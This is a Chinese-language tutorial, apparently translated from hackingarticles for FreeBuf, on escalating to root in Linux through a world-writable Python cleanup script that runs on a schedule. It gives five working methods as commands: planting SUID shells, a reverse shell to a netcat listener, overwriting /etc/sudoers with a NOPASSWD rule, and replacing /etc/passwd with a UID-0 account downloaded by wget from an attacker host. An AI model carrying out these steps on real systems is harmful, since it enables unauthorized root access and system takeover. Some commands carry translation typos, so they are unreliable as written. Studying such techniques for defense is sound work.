![1.png](https://image.3001.net/images/20180618/15292585368292.png!small)

## 写在前面的话

**在Linux系统中，任何东西都是以文件形式存在的，包括目录和设备在内，它们都拥有读取、写入和执行权限（需配置）。当管理员在设置文件权限时，必须根据Linux用户的具体情况来进行设置。**

在这篇文章中，我们将跟大家讨论如何通过可写文件/脚本来实现Linux下的提权。接下来，我们直奔主题。

打开你的电脑，然后入侵目标系统，我们直接进入到提权环节。假设我已经通过ssh成功登录目标设备，然后访问了非root用户终端。接下来，使用下列命令枚举出全部拥有可写权限的文件：

    
    
    find / -writable -type  f 2>/dev/null | grep -v "/proc/"

你可以看到，结果中有一个存储在/lib/log目录中的python文件，查看之后我们发现sanitizer.py的权限为777：

![2.png](https://image.3001.net/images/20180618/15292585509965.png!small)

看来这个文件是管理员用来清理/tmp目录垃圾的，这种文件会在一定的时间间隔后自动执行。如果攻击者也发现了这一点，那么他们就能够通过接下来所介绍的方式实现提权了。

![3.png](https://image.3001.net/images/20180618/15292585564182.png!small)

## 第一种方法

把/bin/sh拷贝到/tmp中，启用/tmp/sh的SUID。这种方法很简单，首先使用编辑器来打开文件，例如“nanosanitizer.py”，然后用下列内容替换掉“rm
-r/tmp”：

    
    
    os.system('cp/bin/sh /tmp/sh')
    os.system('chmodu+s /tmp/sh')

![4.png](https://image.3001.net/images/20180618/15292586523289.png!small)

接下来，它会在/tmp目录中创建一个拥有SUID权限的sh文件，你运行该文件之后你就能拿到root权限了。

    
    
    cd /tmp
    ls
    ./sh
    id
    whoami  
    

![5.png](https://image.3001.net/images/20180618/15292586656316.png!small)

## 第二种方法

跟之前的方法一样，你可以用下列代码替换掉原来的“rm -r /tmp”：

    
    
    os.system(‘chmod u+s /bin/dash)

![6.png](https://image.3001.net/images/20180618/15292587204860.png!small)

一段时间之后，它会给/bin/dash文件设置SUID权限，当你运行它之后你就能拿到root权限了：

    
    
    /bin/dash
    id
    whoami

![7.png](https://image.3001.net/images/20180618/15292587387607.png!small)

## 第三种方法

这里我们需要将python反向shell连接代码复制到“rm -r /tmp/*”这里，然后在新的终端里开启netcat监听器：

![8.png](https://image.3001.net/images/20180618/15292587533221.png!small)

一段时间之后你就会通过netcat拿到反向shell连接，并获取到root权限了：

    
    
    nc-lvp 1234
    id
    whoami  
    

![9.png](https://image.3001.net/images/20180618/15292587847500.png!small)

## 第四种方法

这是一种最有趣的方法，我们可以通过这种方法来使用sudo权限去登录目标设备。大家可以看到，wernerbrandes现在还无法运行sudo命令：

![10.png](https://image.3001.net/images/20180618/1529258811407.png!small)

将下列代码替换掉“rm -r /tmp/*”：

    
    
    os.system('echo"wernerbrandes ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers')

![11.png](https://image.3001.net/images/20180618/15292588296654.png!small)

一定时间之后，当你运行“sudo -l”命令之后，你就会发现这个账号变成了sudo用户，然后你就可以拿到root权限了：

    
    
    sudo -l
    sudo bash
    id

## 第五种方法

在任何一个类Linux系统中，passwd文件的重要性不言而喻，如果攻击者可以访问或修改这个文件，那么该文件就变成了一种提权方式。在可写脚本的帮助下，我们可以使用cat命令来访问etc/passwd文件。

大家可以从下图中看到高亮标注的nemo用户信息，我猜测UID:1000 &
GID:1000表示该用户很可能在管理员组里面。我们需要修改nemo记录并让它成为root组成员。首先，把etc/passwd文件的内容拷贝到一个空白的text文件中。

![12.png](https://image.3001.net/images/20180618/15292588584070.png!small)

然后在新的终端里，生成salt密码：

    
    
    openssl passwd -1 -salt abc 123

![13.png](https://image.3001.net/images/20180618/15292588783515.png!small)

把salt密码拷贝到nemo用户记录条目的“X”位置，把之前的UID&GID改成0:0。完成所有步骤之后，把刚才新建的text文件保存问“passwd”，然后把这个文件拷贝到目标主机中覆盖掉原始的passwd文件。

    
    
    cd Desktop
    python -m SimpleHTTPServer 80

![14.png](https://image.3001.net/images/20180618/15292589029236.png!small)

利用可写脚本，用下列命令替换掉“rm -r /tmp/*”：

    
    
    os.system(‘chmod u+s /bin/cp)

过一段时间之后它将会开启/bin/cp的SUID权限，然后完成文件拷贝。

![15.png](https://image.3001.net/images/20180618/1529258922291.png!small)

将修改后的passwd文件拷贝到目标主机的/tmp目录中，然后输入下列命令：

    
    
    cd /tmp
    wget http://192.168.1.103/passwd
    ls -al /bin/cp
    cp passwd /etc/passwd

![16.png](https://image.3001.net/images/20180618/15292589768217.png!small)

使用下列命令查看passwd文件是否替换成功：

    
    
    tail /etc/passwd

![17.png](https://image.3001.net/images/20180618/15292589972510.png!small)

通过下列命令拿到root权限：

    
    
    su nemo
    password123
    whoami

## 总结

在这篇文章中我们给大家演示了攻击者如何利用可写文件实现提权，希望大家喜欢。

![18.png](https://image.3001.net/images/20180618/15292590267419.png!small)

 *** 参考来源：[hackingarticles](http://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

